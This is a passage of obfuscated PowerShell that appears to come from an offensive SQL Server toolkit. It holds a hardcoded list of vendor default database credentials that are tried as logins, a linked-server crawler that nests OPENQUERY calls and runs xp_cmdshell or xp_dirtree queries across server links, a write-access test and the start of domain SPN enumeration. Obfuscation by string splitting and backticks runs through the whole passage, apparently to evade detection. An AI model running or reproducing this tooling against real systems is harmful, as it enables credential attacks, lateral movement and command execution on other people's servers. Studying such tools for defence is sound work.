        ${de`FA`U`Lt`PAsSW`orDS}."rO`WS".("{1}{0}" -f 'dd','A').Invoke(("{2}{1}{0}" -f'A','DAT','DEXIS_'),("{1}{0}" -f 's','dexi'),("{0}{1}" -f 'd','exis')) | &("{1}{0}" -f'Null','Out-')
        ${Defa`U`Lt`pa`SswOrDS}."rO`ws".("{1}{0}"-f'd','Ad').Invoke(("{2}{1}{3}{0}" -f 'M','TKI','SM','NGDO'),("{0}{2}{1}" -f 'SMTKIN','M','GDO'),(('39Ze'+'i3'+'9Z'+'micM'+'icro')."RE`pL`Ace"(([CHar]51+[CHar]57+[CHar]90),[sTriNG][CHar]36))) | &("{1}{0}{2}" -f '-Nu','Out','ll')
        ${De`FAUl`TP`ASSwORDs}."r`OWs".("{1}{0}"-f'd','Ad').Invoke(("{1}{0}"-f'E7_MS','R'),("{1}{2}{0}"-f 'rvisor','Su','pe'),("{0}{2}{1}"-f'S','sor','upervi')) | &("{0}{2}{1}" -f 'Ou','-Null','t')
        ${deFA`U`LTPaSSW`O`RdS}."R`oWS".("{0}{1}" -f'A','dd').Invoke(("{1}{0}" -f 'S','RE7_M'),("{0}{1}" -f'Ad','min'),("{1}{0}"-f 'n','Admi')) | &("{2}{0}{1}"-f 'N','ull','Out-')
        ${dEFAULtpa`s`s`woRDs}."RO`wS".("{0}{1}" -f'Ad','d').Invoke("OHD","sa",("{0}{1}{3}{2}"-f 'oh','d','sa@123','u')) | &("{0}{1}" -f'Out-Nu','ll')
        ${DE`F`Au`LtPasSwoRdS}."rO`wS".("{0}{1}"-f 'Ad','d').Invoke("UPC",("{1}{0}{3}{2}"-f'vice','ser','min','ad'),("{1}{0}{2}" -f'ssw','Pa','ord.0')) | &("{0}{2}{1}"-f 'Out-','ull','N')           
        ${de`FAU`lTpASSw`o`RDS}."RO`WS".("{1}{0}" -f'd','Ad').Invoke(("{1}{0}" -f'h','Hirs'),("{2}{1}{0}" -f 'ocity','el','V'),("{0}{1}{2}"-f'i5','X9FG4','2')) | &("{1}{0}" -f 'll','Out-Nu')
        ${D`EfAUl`TPa`sSWo`Rds}."RO`Ws".("{1}{0}"-f 'd','Ad').Invoke(("{1}{0}"-f'h','Hirs'),"sa",("{0}{1}" -f'i5X9F','G42')) | &("{0}{1}"-f 'O','ut-Null')
        ${d`eFAULT`PaS`sWORDS}."Ro`Ws".("{0}{1}" -f'A','dd').Invoke(("{1}{0}"-f 'SQL','SP'),"sa",("{2}{0}{1}" -f'u','rityMaster08','Sec')) | &("{1}{0}" -f'-Null','Out')
        ${d`EFAUl`TPASsW`Ords}."RO`ws".("{0}{1}"-f 'A','dd').Invoke(("{1}{0}"-f'WARE','CARE'),"sa",'') | &("{1}{2}{0}" -f'll','Out-','Nu')        

        ${Pw`Co`UNt} = ${DE`F`AuLTPAS`sWORdS} | &("{1}{0}{2}"-f'sur','mea','e') | &("{0}{1}" -f'se','lect') ("{1}{0}" -f 't','coun') -ExpandProperty ("{0}{1}" -f'coun','t')
        
    }

    Process
    {
        
        ${cO`M`p`UTEr`NAme} = &("{3}{6}{1}{5}{0}{4}{2}"-f'eFro','terN','nce','Get-Comp','mInsta','am','u') -Instance ${inSTan`ce}

        
        if(-not ${I`Nstan`ce})
        {
            ${inSt`AN`Ce} = ${eNv:cOmpUTe`R`Na`ME}
        }
       
        
        ${TarGE`TInS`TAN`ce} = ${IN`stA`N`ce}.("{1}{0}"-f 'it','Spl').Invoke("\")[1]

        
        if(-not ${TAr`GETi`N`St`ANCE}){
            &("{1}{3}{0}{2}" -f'e','Wri','rbose','te-V') ("$Instance "+': '+'No'+' '+'named'+' '+'inst'+'ance'+' '+'f'+'ou'+'nd.')
            return
        }
       
        
        ${tBlR`es`U`ltSteMp} = ""
        ${tBlr`E`Su`lTS`TEmp} = ${defA`U`L`TPa`ssWORds} | &("{2}{0}{1}" -f 'Obje','ct','Where-') { ${_}."InS`TAnCe" -eq "$TargetInstance"}        

        if(${tBLr`EsuLTstE`mp}){    
            &("{2}{1}{3}{0}" -f 'se','rit','W','e-Verbo') ("$Instance "+': '+'Confir'+'me'+'d '+'in'+'stan'+'ce '+'ma'+'tch.') 
        }else{
            &("{1}{3}{0}{2}"-f'os','W','e','rite-Verb') ("$Instance "+': '+'N'+'o '+'instance'+' '+'m'+'atch '+'f'+'ou'+'nd.')
            return 
        }        

        
		
		
		
		
		
		for(${i}=0; ${I} -lt ${tb`L`R`EsulT`stEMp}."c`oUNt"; ${i}++){
			
			${cuRrE`NTusErN`A`me} = ${T`B`l`ResuLTsTEMP}."USern`A`mE"[${i}]
			${CurREnT`pA`sSwO`RD} = ${t`BLrE`SULtsT`e`MP}."PAssw`O`Rd"[${i}]
			${LogiN`T`est} = &("{4}{3}{0}{2}{1}"-f 'Serv','rInfo','e','-SQL','Get') -Instance ${i`NStANCe} -Username ${c`UrREN`TUSer`NAme} -Password ${cURrEntpAss`w`ORD} -SuppressVerbose
			if(${LO`g`i`NTest}){

				&("{1}{0}{2}" -f'Verbo','Write-','se') ("$Instance "+': '+'Co'+'n'+'firmed'+' '+'defa'+'ult '+'cr'+'ed'+'enti'+'als '+'- '+"$CurrentUsername/$CurrentPassword")

				${sY`sa`dmINSTatus} = ${lO`g`INte`sT} | &("{1}{0}"-f 't','selec') ("{0}{2}{1}"-f'IsSy','dmin','sa') -ExpandProperty ("{1}{0}{2}"-f'admi','IsSys','n')

				
				${tB`l`Res`UltS}."R`oWS".("{0}{1}"-f 'A','dd').Invoke(
					${COMP`UTerNa`ME},
					${iNStAN`Ce},
					${c`UrRen`TUseR`N`AME},
					${C`URRE`Ntp`A`sSwoRd},
					${sysadM`I`Ns`Ta`TUs}
				) | &("{0}{2}{1}" -f'Out','Null','-')
			}else{
				&("{0}{1}{3}{2}"-f 'Writ','e-V','e','erbos') ("$Instance "+': '+'N'+'o '+'creden'+'tia'+'l'+' '+'m'+'atch'+'es '+'were'+' '+'fou'+'nd'+'.')
			}
		}
    }

    End
    {
        
        ${TBl`RE`SU`lTs}
    }
}

Function get-S`QLSe`RV`ERlI`Nk`cRaWl{
    
    [CmdletBinding()]
    Param(
        [Parameter(ManDatoRy=${fAL`Se},
        helpMEsSAge={"{4}{5}{0}{3}{6}{8}{7}{2}{1}" -f'r or doma','h.','ate wit','in acc','SQL Serv','e','o',' to authentic','unt'})]
        [string]${u`sERn`AmE},

        [Parameter(MandaTorY=${F`ALSE},
        HelPmESsagE={"{0}{6}{1}{4}{2}{8}{11}{12}{5}{3}{10}{7}{9}" -f 'SQL Serve','count','pa','nticate',' ','uthe','r or domain ac','ith','sswo','.',' w','r','d to a'})]
        [string]${PasSw`orD},

        [Parameter(mandatorY=${fA`LSE},
        HeLpmESSaGE={"{0}{2}{1}{3}" -f'Window',' ','s','credentials.'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${Cre`D`ential} =  (  GeT-vaRiablE  ("04"+"5"+"9m2")).valUE::"e`mPty",
        
        [Parameter(MAnDATory=${fal`SE},
        VaLUeFrOMpIPELinebYPROPertYnaME=${TR`UE},
        helPmeSsAge={"{2}{1}{0}{6}{5}{7}{4}{3}"-f'ver ins','L Ser','SQ','.','on to',' conn','tance to','ecti'})]
        [string]${In`STA`NCE},

        [Parameter(maNDatOrY=${f`A`LSe},
        HELPmEsSAGE={"{10}{2}{4}{5}{7}{8}{3}{6}{1}{0}{9}" -f'A','n (D','edicated','ti',' ','Admi','o','nistrator C','onnec','C).','D'})]
        [Switch]${D`AC},

        [Parameter(mAnDAtoRy=${f`A`Lse},
        HelPMEsSAGe={"{0}{4}{3}{1}{2}" -f 'Conne','eou','t.','m','ction ti'})]
        [int]${Ti`ME`oUT} = 2,

        [Parameter(MaNDAtORy=${f`A`Lse},
        HeLPMeSsAGe={(("{13}{22}{19}{12}{10}{7}{0}{24}{17}{6}{2}{23}{9}{4}{21}{11}{14}{8}{1}{16}{15}{3}{20}{5}{18}" -f 'isnG0',' on e','ve','v',' wil','r','gi','rget ','n',' this','eryTa',' ','uery to run. If Qu','Cus','ru','er','ach s',' ','.','q','e','l','tom SQL ','n,','2s'))."R`ePlacE"(([Char]71+[Char]48+[Char]50),[STring][Char]39)})]
        [string]${qUe`RY},

        [Parameter(MANdATory=${F`AlSe},
        HelPMESsAgE={"{1}{0}{4}{2}{3}" -f 'to run S','Link ','ue','ry on.','QL q'})]
        [string]${Q`UE`Ryta`RGet},

        [Parameter(MANDAtORy=${fa`Lse},
        heLpmesSagE={"{11}{0}{9}{2}{8}{3}{10}{5}{4}{6}{7}{1}"-f 'e','ormat.','t co','ec','dat','d ','a to expo','rtable f','ll','r','te','Conv'})]
        [switch]${Ex`pOrT},

        [Parameter(manDaTORY=${FA`Lse},
        hELpmEssaGe={"{3}{9}{8}{11}{14}{15}{12}{0}{10}{16}{13}{2}{4}{17}{1}{6}{5}{7}" -f' t','easie','e for','Convert ','mat that i','work ','r to ','with.','o','c','o','ll','ta','bl','ected d','a',' exporta','s '})]
        [switch]${eXp`OR`T2}
    )

    Begin
    {   
        ${lI`sT} = @()

        ${seR`V`ER} = &("{0}{2}{1}"-f'Ne','ject','w-Ob') ("{1}{2}{0}" -f 't','PSO','bjec') -Property @{ ("{0}{1}"-f'Insta','nce')=""; ("{2}{0}{1}" -f 'e','rsion','V')=""; ("{0}{1}" -f'Li','nks')=@(); ("{0}{1}" -f'Pa','th')=@(); ("{1}{0}" -f'er','Us')=""; ("{2}{0}{1}"-f 'y','sadmin','S')=""; ("{1}{0}{2}" -f'omQu','Cust','ery')=""}

        ${L`isT} += ${s`e`RvER}
        ${SQlin`F`OTaBlE} = &("{1}{0}{2}"-f 'jec','New-Ob','t') ("{2}{3}{1}{0}" -f'DataTable','Data.','S','ystem.')
    }
    
    Process
    {
        ${I}=1
        while(${i}){
            ${i}--
            foreach(${SER`V`er} in ${l`iSt}){
                if(${sER`VEr}."iN`STA`NCE" -eq "") {
                    ${L`IsT} = (&("{0}{1}{3}{2}{4}{5}" -f 'G','et-SQ','Ser','L','verLinkDat','a') -list ${Li`ST} -server ${s`E`RveR} -query ${que`RY} -QueryTarget ${Q`UERYTA`RG`et})
                    ${i}++

                    
                    &("{1}{0}{2}" -f 'te-Verbo','Wri','se') ("{3}{0}{5}{2}{1}{4}"-f '------------','-----','---','----','------','--')
                    &("{1}{0}{2}" -f '-Ver','Write','bose') " Server: $($Server.Instance) "
                    &("{2}{1}{3}{0}"-f 'ose','V','Write-','erb') ("{7}{4}{5}{0}{6}{2}{1}{3}"-f '--','-','----','-------','----','---------','----','-')
                    &("{1}{2}{3}{0}"-f'ose','Writ','e-','Verb') " - Link Path to server: $($Server.Path -join ' -> ') "                    
                    &("{0}{1}{3}{2}"-f 'Wri','t','rbose','e-Ve') " - Link Login: $($Server.User) "                                   
                    &("{4}{2}{0}{3}{1}"-f'V','bose','rite-','er','W') " - Link IsSysAdmin: $($Server.Sysadmin) "
                    &("{1}{4}{3}{2}{0}" -f 'bose','Wr','r','-Ve','ite') " - Link Count: $($Server.Links.Count) "                    
                    &("{3}{2}{1}{0}{4}"-f 'V','te-','ri','W','erbose') " - Links on this server: $($Server.Links -join ', ') "
                }   
            } 
        }

        
        if(${eXpO`Rt}){
            ${LIn`kl`isT} = &("{2}{0}{1}{3}"-f'w-','Ob','Ne','ject') ("{4}{2}{0}{1}{3}" -f'stem.','Data.Da','y','tatable','S')
            [void]${L`iNkl`IsT}."C`OLU`MNS".("{0}{1}"-f'A','dd').Invoke(("{2}{0}{1}" -f 'ns','tance','I'))
            [void]${L`i`NKLiSt}."cOLUm`NS".("{0}{1}" -f'A','dd').Invoke(("{0}{1}"-f 'V','ersion'))
            [void]${l`iNKlI`sT}."cOlUM`NS".("{1}{0}" -f 'd','Ad').Invoke(("{0}{1}" -f'Pat','h'))
            [void]${lin`kl`IsT}."CO`LUmnS".("{1}{0}" -f 'd','Ad').Invoke(("{1}{0}"-f'ks','Lin'))
            [void]${l`In`KLiST}."co`lU`mNs".("{0}{1}"-f'A','dd').Invoke(("{1}{0}" -f'r','Use'))
            [void]${l`InK`LISt}."cO`LUM`Ns".("{1}{0}"-f'dd','A').Invoke(("{0}{1}"-f 'Sysadm','in'))
            [void]${L`I`NKList}."C`Ol`UmNs".("{0}{1}" -f'Ad','d').Invoke(("{3}{1}{2}{0}" -f 'y','ust','omQuer','C'))
            
            foreach(${se`Rv`er} in ${l`isT}){
                [void]${L`iN`klist}."r`owS".("{0}{1}"-f'Ad','d').Invoke(${SE`R`VeR}."In`s`TanCe",${s`E`RvER}."vERsi`on",${Ser`V`ER}."P`ATH" -join ("{0}{1}" -f' -','> '), ${Se`RVER}."li`NKs" -join ",", ${S`ERv`Er}."u`seR", ${seR`VEr}."SysAD`mIn", ${sERv`Er}."cus`Tom`que`Ry" -join ",")
            }

            return ${li`NKL`isT}
            break
        }

        
        if(${EXPO`Rt2}){
            ${LIn`k`lIsT} = ${Li`sT} | 
            &("{1}{2}{0}" -f 'ch','fore','a') {
                [string]${sT`RiNgL`INK`pATH} = ""
                ${Pa`TH} = ${_}."pA`Th" 
                ${pATH`COU`NT} = ${PA`TH}."c`OunT" - 1       
                ${LinK`s`Rc} = ${pA`TH}[${PaT`hC`ouNT} -1]
                ${LiN`kD`eS} = ${PA`Th}[${p`At`hc`OUNt}]
                ${liN`KuSer} = ${_}."uS`Er"
                ${L`INKde`ssysAD`min} = ${_}."SyS`A`DMin"
                ${i`NStAN`ce} = ${_}."i`NStAn`Ce" 
                ${linkDeS`VERS`i`on} = ${_}."VEr`Si`ON"
                ${P`ATH} |
                &("{0}{2}{1}"-f'fo','ch','rea') {
                    if ( ${StRINgL`IN`K`pa`TH} -eq ""){
                        [string]${strIng`LI`NkPatH} = "$_" 
                    }else{
                        [string]${S`TR`in`gLi`NKpAtH} = ("$StringLinkPath "+'-'+'> '+"$_")         
                    }
                }
                ${O`BJECT} = &("{1}{0}{2}" -f '-','New','Object') ("{1}{0}{2}"-f 'SObjec','P','t')        
                ${Obj`e`CT} | &("{2}{1}{0}" -f'r','dd-membe','a') ("{2}{1}{3}{0}" -f 'y','pro','Note','pert') ("{1}{2}{0}" -f'rc','Lin','kS')          ${LI`N`ksrc}
                ${o`BJECt} | &("{0}{3}{1}{2}"-f'a','-','member','dd') ("{3}{2}{0}{1}"-f'p','erty','o','Notepr') ("{0}{1}{2}" -f'LinkNa','m','e')         ${li`N`KdeS}
                ${OB`JeCT} | &("{2}{0}{1}"-f 'd-me','mber','ad') ("{1}{2}{0}"-f 'erty','Notepr','op') ("{0}{2}{1}"-f 'L','nce','inkInsta')     ${in`StANCE}     
                ${oBj`ECt} | &("{2}{0}{1}{3}" -f'dd-','me','a','mber') ("{0}{3}{2}{1}" -f'N','ty','proper','ote') ("{0}{1}" -f'LinkUs','er')         ${LI`NKUsEr}
                ${O`BjECT} | &("{0}{3}{1}{2}"-f 'ad','-memb','er','d') ("{1}{2}{0}"-f'rty','Not','eprope') ("{3}{1}{0}{2}"-f 'a','nkSys','dmin','Li')     ${lI`Nkdess`YsAD`mIn}        
                ${obj`e`cT} | &("{2}{1}{0}"-f 'er','mb','add-me') ("{2}{0}{1}" -f 'per','ty','Notepro') ("{0}{2}{1}"-f'LinkVer','ion','s')      ${L`Ink`DesveRSI`ON} 
                ${oBj`E`ct} | &("{1}{2}{0}" -f 'ber','add','-mem') ("{2}{0}{1}" -f'e','property','Not') ("{0}{1}"-f 'Li','nkHops')         ${p`ATh`counT} 
                ${ob`JE`Ct} | &("{1}{0}{2}" -f 'dd-','a','member') ("{1}{3}{0}{2}"-f 'ert','Notepr','y','op') ("{0}{2}{1}" -f 'L','th','inkPa')         ${StR`inGL`iNkPA`Th}
                ${obJE`Ct} 
            } 
           
            return ${LI`NK`lIST}
            break
        }
        
        
        ${Li`St}
    }
  
    End
    {
    }
}

Function GE`T-sQL`sE`RVeRLin`KDAta{
    [CmdletBinding()]
    Param(
        [Parameter(ManDAtORY=${t`RUe},
        HElpmesSage={"{7}{26}{8}{3}{0}{22}{10}{12}{29}{31}{1}{33}{2}{4}{20}{19}{16}{6}{27}{24}{35}{17}{34}{30}{18}{32}{25}{14}{5}{21}{13}{23}{36}{11}{15}{9}{28}"-f 'serv','f','d d','he ','uring','i','r','Retu','t','l functi','obj','in','ects id','eGet-S','ne v','kCraw',' se','c','is','he',' t','a th','er ','QLSe','.  Li','o','rn ','ver link crawl','on.','e',' ','nti',' d','ie','rawling','nk ','rverL'})]
        ${l`IST},
        
        [Parameter(MAndAtory=${tR`UE},
        HElpmessaGe={"{5}{2}{3}{1}{0}{4}"-f' b','o','erver ','object t','e tested','S'})]
        ${s`E`Rver},

        [Parameter(MAnDaTory=${Fa`LsE},
        hELPMEssAGE={"{5}{7}{3}{6}{4}{1}{2}{0}"-f 'n',' ','ru','Q','ry to','Custom','L que',' S'})]
        ${QU`e`Ry},

        [Parameter(mANDAToRY=${fA`Lse},
        hELPmESsAGE={"{6}{3}{2}{5}{4}{1}{7}{0}{8}" -f 'o r','ue','get of c','r','tom SQL q','us','Ta','ry t','un'})]
        ${QU`ErYTaR`gEt}
    )

    Begin
    {
        ${SqlInfO`QUE`Ry} = ((("{18}{8}{3}{0}{28}{31}{27}{4}{20}{16}{2}{6}{22}{32}{24}{11}{10}{14}{23}{19}{1}{7}{34}{9}{33}{13}{26}{12}{17}{5}{29}{21}{25}{15}{30}"-f's','is','rsion, s','lect @@',' servern','sysadmi','yst','_sr','e','r','linku','r as ','7','me','s',' ro','as ve','tV','s',', ','ame, @@version ','7tV)','em_','er','e',' as','mber(','me as','erv','n','le','erna','us','ole','v'))."R`EpLa`CE"('7tV',[STRING][cHAR]39))
        ${S`Qllin`kSqUe`RY} = ("{14}{7}{1}{10}{12}{13}{9}{3}{5}{17}{6}{16}{8}{2}{11}{0}{4}{15}" -f 'data','t','r','aste','access=','r.','ysserv','c','s whe','om m',' ','e ','srvnam','e fr','sele','1','er','.s')
    }

    Process
    {
        ${sQL`In`F`Ota`BlE} = &("{0}{1}{2}"-f 'Get-SqlQu','e','ry') -instance ${i`N`sTaNce} -Query ((&("{2}{1}{6}{3}{0}{4}{5}" -f 'nkQu','LServe','Get-SQ','i','er','y','rL') -path ${S`ErvEr}."Pa`Th" -sql ${sqlI`N`FoQ`Ue`RY})) -Timeout ${t`Imeo`UT} -Username ${uSer`Na`mE} -Password ${Pa`SSw`o`RD} -Credential ${CrEDent`i`AL}
        if(${sQL`INFotAb`le}."SERvE`Rna`ME" -ne ${n`ULL}){
            ${S`ervER}."I`NS`TanCe" = ${s`qLInfOtAb`le}."serve`RN`A`ME"
            ${SeR`VEr}."v`E`RsiON" =  ( VarIABlE PGR2i  -vaLu  )::("{1}{0}"-f 'oin','J').Invoke("",((${s`QliN`FOTable}."Versi`on")[10..25]))
            ${seR`V`eR}."sYs`Ad`Min" = ${sQ`liNFO`Tab`Le}."RO`le"
            ${S`E`RVER}."US`Er" = ${S`qLinfO`T`ABlE}."LInk`UsEr"
            
            if(${LI`St}."C`OUNt" -eq 1) { ${se`Rv`ER}."p`ATH" += ,${s`QLi`NFOT`Ab`lE}."SeR`VeRnA`ME" }

            ${sqlin`F`OTA`B`LE} = &("{2}{1}{3}{0}"-f 'y','e','Get-SqlQu','r') -instance ${InST`An`Ce} -Query ((&("{0}{1}{5}{4}{6}{2}{3}" -f 'G','et','rL','inkQuery','LSe','-SQ','rve') -path ${Se`RVer}."P`Ath" -sql ${S`Q`lLi`NksQ`UerY})) -Timeout ${Ti`MEOuT} -Username ${u`Se`Rna`mE} -Password ${pa`s`swo`RD} -Credential ${cred`Ent`iaL}
            ${ser`VER}."LiN`Ks" = [array]${sq`l`infotABlE}."srV`NamE"

            if(${qu`eRY} -ne ""){
                if(${qU`Er`yt`ARGET} -eq "" -or (${qUer`yt`ARGeT} -ne "" -and ${sEr`V`eR}."InS`TAn`CE" -eq ${Q`UERyT`ARg`ET})){
                    if(${Qu`ERY} -like ("{2}{3}{1}{0}" -f '*','l','*xp_cmdsh','el')){
                        ${QU`E`RY} =  ${Qu`erY} + ((("{1}{2}{4}{6}{7}{3}{8}{5}{0}" -f'AR(8000)))',' ','WITH RE','((o','SULT SE','t VARCH','TS',' ','utpu')))
                    }
                    if(${QUE`RY} -like ("{2}{3}{0}{1}"-f 't','ree*','*xp','_dir')){
                        ${QuE`RY} = ${Q`UeRy} + (("{1}{11}{5}{12}{2}{3}{0}{7}{13}{14}{15}{16}{4}{6}{8}{10}{9}" -f'((','  ','E','TS ','000)',' ',', depth ','ou','int',')',')','WITH','RESULT S','tput',' V','ARCHAR','(8'))
                    }
                    ${sQL`i`N`FoTaBLE} = &("{1}{0}{2}" -f 'l','Get-Sq','Query') -instance ${INStAn`Ce} -Query ((&("{0}{3}{2}{1}{4}" -f'Get-SQLSer','Link','r','ve','Query') -path ${ser`VeR}."PA`TH" -sql ${que`Ry})) -Timeout ${tI`meo`Ut} -Username ${U`seRNA`mE} -Password ${P`As`sWo`RD} -Credential ${CrED`e`N`Tial}
                    if(${Q`UeRY} -like ("{0}{2}{1}{3}" -f '*W','S','ITH RESULT SET','*')){
                        ${s`e`RVer}."C`UstOM`quErY" = ${s`qLInfOtAB`Le}."oUTP`Ut"
                    } else {
                        ${serv`Er}."CUsTO`M`qU`erY" = ${SqlI`N`FoTa`Ble}
                    }
                }
            }

            if((${se`RvER}."pa`TH" | &("{1}{0}{2}{3}" -f '-','Sort','Obje','ct') | &("{0}{1}{2}"-f 'Get-','Uniq','ue'))."c`oUnt" -eq (${SErv`eR}."P`ATh")."cOu`Nt"){
                foreach(${L`INK} in ${S`E`RVER}."L`iNKs"){
                    ${LiNK`pA`Th} = ${sE`RVer}."pa`TH" + ${l`INK}
                    ${li`St} += ,(&("{1}{0}{2}" -f 'jec','New-Ob','t') ("{2}{0}{1}" -f'bjec','t','PSO') -Property @{ ("{2}{0}{1}"-f'an','ce','Inst')=""; ("{0}{1}"-f'Versio','n')=""; ("{0}{1}"-f 'Li','nks')=@(); ("{0}{1}"-f 'P','ath')=${L`IN`kpATH}; ("{0}{1}" -f 'U','ser')=""; ("{0}{2}{1}"-f'Sysa','n','dmi')=""; ("{0}{3}{1}{2}" -f 'C','u','ery','ustomQ')="" })
                }
            }
        } else {
            ${S`ER`VEr}."Inst`A`Nce" = ("{2}{0}{1}" -f ' Lin','k','Broken')
        }
        return ${LI`ST}
    }
}

Function G`eT-`sQLseRve`R`LiN`Kq`UERy{
    [CmdletBinding()]
    Param(
        [Parameter(MANDAtoRy=${fa`L`sE},
        HELPMESSaGe={"{2}{6}{10}{3}{7}{1}{0}{8}{9}{4}{5}" -f 'Ge',' ','SQL','h to c','QLServerLinkCra','wl.',' link','rawl. This is used by','t-','S',' pat'})]
        ${PA`Th}=@(),
        
        [Parameter(MAndAtorY=${F`Al`Se},
        hElpmEssagE={"{2}{1}{7}{6}{5}{4}{0}{3}"-f 'th aroun','o b','SQL query t','d','pa','awl ','he cr','uild t'})]
        ${S`qL}, 
        
        [Parameter(MandATory=${F`AL`se},
        helPMEssAge={"{4}{0}{9}{2}{6}{10}{8}{5}{11}{7}{1}{3}{12}"-f 'ount','e',' to determi','ede','C','o','ne how','n','le qu','er',' many sing','tes ','d'})]
        ${ti`c`ks}=0

    )
    if (${pa`Th}."le`NgTH" -le 1){
        return(${s`qL} -replace "'", ("'"* $gMuYP::("{1}{0}"-f 'w','po').Invoke(2,${T`icKs})))
    } else {
        return(('se'+'l'+'ect '+'* '+'f'+'rom '+"openquery(`"")+${Pa`Th}[1]+"`","+"'"* (  GEt-variAbLe  GMuYp  -vAluEOnL  )::("{0}{1}"-f'po','w').Invoke(2,${tIc`kS})+
        (&("{3}{1}{0}{2}"-f'verLinkQue','Ser','ry','Get-SQL') -path ${Pa`Th}[1..(${PA`TH}."LE`Ng`TH"-1)] -sql ${S`qL} -ticks (${TiC`KS}+1))+"'"* (  gI vARiAbLe:GMUyp ).VALUe::("{1}{0}" -f 'w','po').Invoke(2,${TIc`Ks})+")")
    }
}






Function TeSt-fOlD`E`RwRitEA`c`cE`ss
{
    
    [CmdletBinding()]
    Param(
        [Parameter(MANdATOrY = ${fA`LSe},
        VAluEFrompIPELIne = ${TR`Ue},
        ValUEfROMPIpElInEbYpROpErtYnAME = ${t`RuE},
        hELPMEsSAge = {"{11}{8}{9}{2}{0}{10}{4}{12}{5}{6}{3}{7}{1}"-f'ld li','ss to.','u','c',' ','o t','est write a','ce','r you',' wo','ke','Folde','t'})]
        [string]${o`Utfo`LdeR}
    )

    Process
    {
        
        ${WRitE`T`Estf`ILe} = (-join ((65..90) + (97..122) | &("{1}{3}{2}{0}" -f 'm','Ge','ndo','t-Ra') -Count 15 | &('%') {[char]${_}}))

        
        Try { 
            &("{2}{1}{0}" -f 'st','te-Ho','Wri') ("{0}{1}"-f'tes','t') | &("{0}{1}"-f'Out-','File') "$OutFolder\$WriteTestFile"
            &('rm') "$OutFolder\$WriteTestFile"
            return ${t`RUe}
        }Catch{  
            return ${F`A`lSe}
        }
    }
}













function g`Et-dO`MAIN`Spn
{
    
    [CmdletBinding()]
    Param(
        [Parameter(manDaTOrY = ${fa`l`Se},
        helpMeSSaGe = {(("{0}{13}{2}{7}{6}{5}{9}{3}{10}{4}{12}{1}{14}{11}{8}"-f 'Domai','ncm7','er to ','ate','th ','enti','uth','a','r.','c',' wi','e','domai','n us','us'))."rePLA`Ce"(([cHar]99+[cHar]109+[cHar]55),[strING][cHar]92)})]
        [string]${uSe`R`N`Ame},

        [Parameter(MandaTory = ${F`ALse},
        hELpMeSSAGE = {(("{0}{7}{8}{9}{4}{11}{3}{10}{2}{5}{1}{6}"-f 'Do','domai','cate with','n','ord to auth',' ','nY5Duser.','ma','in p','assw','ti','e'))  -REpLacE'Y5D',[CHar]92})]
        [string]${p`ASSwo`RD},

        [Parameter(MandaTorY = ${FA`LSe},
        HElPmESsAgE = {"{13}{6}{9}{1}{0}{8}{10}{4}{3}{5}{11}{7}{2}{12}"-f ' ',' when','lle','c','ne','ting to a Domai',' to','o','co',' use','n','n Contr','r.','Credentials'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${cR`E`d`ENtiAl} =   (  geT-iteM  vaRiaBLe:0459M2 ).vALue::"Em`pTY",

        [Parameter(MAndAtOry = ${f`AL`Se},
        hElPMESSAgE = {"{13}{15}{10}{1}{8}{0}{7}{17}{6}{14}{4}{11}{5}{16}{3}{2}{9}{12}"-f'er f','contro','y ','ant to quer','at ','u','omai','o','ll','again',' ','yo','st.','D','n and Site th','omain',' w','r D'})]
        [string]${d`om`AINcoNt`Rol`leR},

        [Parameter(mandAtORy = ${F`ALSe},
                VALuefRomPiPelIneByprOpERtyname = ${T`RUE},
        HelPmessaGe = {"{5}{2}{6}{1}{3}{4}{0}"-f'er for.','f','ame t','i','lt','Computer n','o '})]
        [string]${COMPU`TE`R`NAME},

        [Parameter(MAnDAtORy = ${fA`lse},
                VAlUEfrOmpiPeliNE = ${t`Rue},
                VaLueFROMPipELINEByPrOpErtYnamE = ${TR`UE},
        HelpMeSsaGE = {"{4}{0}{5}{3}{2}{1}"-f 'ccount','or.','ter f','to fil','Domain a',' '})]
        [string]${DOMai`Na`c`COU`NT},

        [Parameter(mANDAtory = ${F`ALSE},
                vAlueFROmPiPelinebYpropertYNAmE = ${TR`Ue},
        HeLPMesSaGE = {"{1}{0}{3}{2}"-f'vi','SPN ser','code.','ce '})]
        [string]${spn`SEr`VIce},

        [Parameter(MANDATory = ${f`ALse},
        helpMesSaGE = {"{0}{9}{7}{8}{4}{5}{2}{1}{6}{3}"-f 'S','ion is','unct','apped.','d',' when f',' wr','bose errors. ',' Use','uppress ver'})]
        [switch]${suP`p`RES`SvE`RboSE}
    )

    Begin
    {
        if(-not ${SU`P`PResSV`erboSE})
        {
            &("{3}{0}{1}{2}" -f 'rite-Ve','rbo','se','W') -Message ("{5}{1}{0}{2}{3}{4}"-f'ma','do','in S','PNs.','..','Getting ')
        }

        
        ${T`AblEdo`M`Ains`PN} = &("{2}{0}{3}{1}" -f 'e','t','New-Obj','c') -TypeName ("{3}{1}{2}{0}" -f'taTable','ystem.Dat','a.Da','S')
        ${N`UlL} = ${T`AB`LEdo`mai`NSPn}."cOLUM`NS".("{0}{1}" -f 'A','dd').Invoke(("{1}{0}" -f 'd','UserSi'))
        ${NU`Ll} = ${T`AbleDOMAin`spn}."coL`UM`Ns".("{0}{1}" -f 'A','dd').Invoke(("{1}{0}" -f'ser','U'))
        ${N`Ull} = ${t`Abledo`MA`inSPN}."COlUm`NS".("{0}{1}"-f 'A','dd').Invoke(("{0}{1}"-f'UserC','n'))
        ${nu`lL} = ${tABled`OM`A`In`sPN}."c`OLU`Mns".("{1}{0}"-f 'd','Ad').Invoke(("{2}{0}{1}" -f 'c','e','Servi'))
        ${Nu`Ll} = ${tAbl`eD`Oma`iNsPn}."co`LuMnS".("{1}{0}"-f'dd','A').Invoke(("{2}{1}{0}"-f'rName','te','Compu'))
        ${nU`Ll} = ${tABled`o`Ma`iNSPN}."cOlU`Mns".("{1}{0}"-f'd','Ad').Invoke('Spn')
        ${NU`ll} = ${TA`B`lE`domAinsPN}."CO`LuM`Ns".("{1}{0}" -f'd','Ad').Invoke(("{0}{1}{2}" -f 'La','stLo','gon'))
        ${N`ULl} = ${tAB`LEDomAI`N`Spn}."COlu`MnS".("{0}{1}" -f 'A','dd').Invoke(("{0}{1}{2}" -f'D','e','scription'))
        ${TaBlEdOm`A`In`SPN}.("{1}{0}"-f'ear','Cl').Invoke()
    }

    Process
    {

        try
        {
            
            ${sp`N`Fil`TER} = ''

            if(${d`O`MAI`Nac`cOUnt})
            {
